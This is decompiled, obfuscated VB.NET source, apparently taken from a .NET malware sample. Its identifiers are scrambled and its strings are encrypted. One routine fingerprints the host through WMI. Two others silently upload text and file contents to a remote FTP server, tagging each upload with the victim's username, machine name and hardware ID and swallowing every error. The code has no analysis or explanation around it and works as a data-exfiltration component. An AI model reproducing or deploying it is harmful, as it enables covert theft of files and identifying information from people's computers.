Imports System
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Text
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x02000013 RID: 19
	Friend NotInheritable Class GyWbmViNanxKl
		' Token: 0x06000060 RID: 96 RVA: 0x0000C6C4 File Offset: 0x0000A8C4
		Public Shared Function nFyAFAYBITHjh() As String
			Dim text As String = String.Empty
			Dim text4 As String
			Try
				Dim managementClass As ManagementClass = New ManagementClass(GyWbmViNanxKl.getString_0(107403227))
				Dim instances As ManagementObjectCollection = managementClass.GetInstances()
				Using enumerator As ManagementObjectCollection.ManagementObjectEnumerator = instances.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim managementObject As ManagementObject = CType(enumerator.Current, ManagementObject)
						text = managementObject.Properties(GyWbmViNanxKl.getString_0(107403238)).Value.ToString()
					End If
				End Using
				Dim text2 As String = GyWbmViNanxKl.getString_0(107403189)
				Dim managementObject2 As ManagementObject = New ManagementObject(GyWbmViNanxKl.getString_0(107403216) + text2 + GyWbmViNanxKl.getString_0(107403175))
				managementObject2.[Get]()
				Dim text3 As String = managementObject2(GyWbmViNanxKl.getString_0(107403170)).ToString()
				text4 = text3
			Catch ex As Exception
				text4 = If(String.IsNullOrEmpty(text), GyWbmViNanxKl.getString_0(107388731), text)
			End Try
			Return text4
		End Function

		' Token: 0x06000061 RID: 97 RVA: 0x0000C7E8 File Offset: 0x0000A9E8
		Public Shared Sub ATmjNWylGeJO(Optional GGfZJTIeZfqSyf As String = "URL", Optional EmtIKAFvwf As String = "USERNAME", Optional BxrieFCDHWF As String = "ACCESO", Optional EfhtMYGgxswewP As String = "")
			Try
				Dim text As String = GyWbmViNanxKl.nFyAFAYBITHjh()
				Dim ftpWebRequest As FtpWebRequest = CType(WebRequest.Create(String.Concat(New String() { GGfZJTIeZfqSyf, GyWbmViNanxKl.getString_0(107404365), Environment.UserName, GyWbmViNanxKl.getString_0(107404320), Environment.MachineName, GyWbmViNanxKl.getString_0(107404331), text, GyWbmViNanxKl.getString_0(107404326) })), FtpWebRequest)
				ftpWebRequest.Method = GyWbmViNanxKl.getString_0(107402633)
				ftpWebRequest.Credentials = New NetworkCredential(EmtIKAFvwf, BxrieFCDHWF)
				Dim asciiencoding As ASCIIEncoding = New ASCIIEncoding()
				Dim bytes As Byte() = asciiencoding.GetBytes(EfhtMYGgxswewP)
				ftpWebRequest.ContentLength = CLng(bytes.Length)
				Using requestStream As Stream = ftpWebRequest.GetRequestStream()
					requestStream.Write(bytes, 0, bytes.Length)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000062 RID: 98 RVA: 0x0000C8FC File Offset: 0x0000AAFC
		Public Shared Sub DGdOiIgzOMW(Optional EsxiMLIAfaIHpW As String = "URL", Optional AwAIdzsyQmcXX As String = "USERNAME", Optional nvCXoOTWldXjB As String = "ACCESO", Optional jHSdWWdzYFXSmJ As String = "")
			Try
				Dim text As String = GyWbmViNanxKl.nFyAFAYBITHjh()
				Dim ftpWebRequest As FtpWebRequest = CType(WebRequest.Create(String.Concat(New String() { EsxiMLIAfaIHpW, GyWbmViNanxKl.getString_0(107404365), Environment.UserName, GyWbmViNanxKl.getString_0(107404320), Environment.MachineName, GyWbmViNanxKl.getString_0(107404331), text, GyWbmViNanxKl.getString_0(107404331), Path.GetFileName(jHSdWWdzYFXSmJ) })), FtpWebRequest)
				ftpWebRequest.Method = GyWbmViNanxKl.getString_0(107402633)
				ftpWebRequest.Credentials = New NetworkCredential(AwAIdzsyQmcXX, nvCXoOTWldXjB)
				Dim array As Byte() = File.ReadAllBytes(jHSdWWdzYFXSmJ)
				ftpWebRequest.ContentLength = CLng(array.Length)
				Using requestStream As Stream = ftpWebRequest.GetRequestStream()
					requestStream.Write(array, 0, array.Length)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000064 RID: 100 RVA: 0x000028E6 File Offset: 0x00000AE6
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(GyWbmViNanxKl))
		End Sub

		' Token: 0x04000091 RID: 145
		<NonSerialized()>
		Friend Shared getString_0 As GetString
	End Class
End Namespace
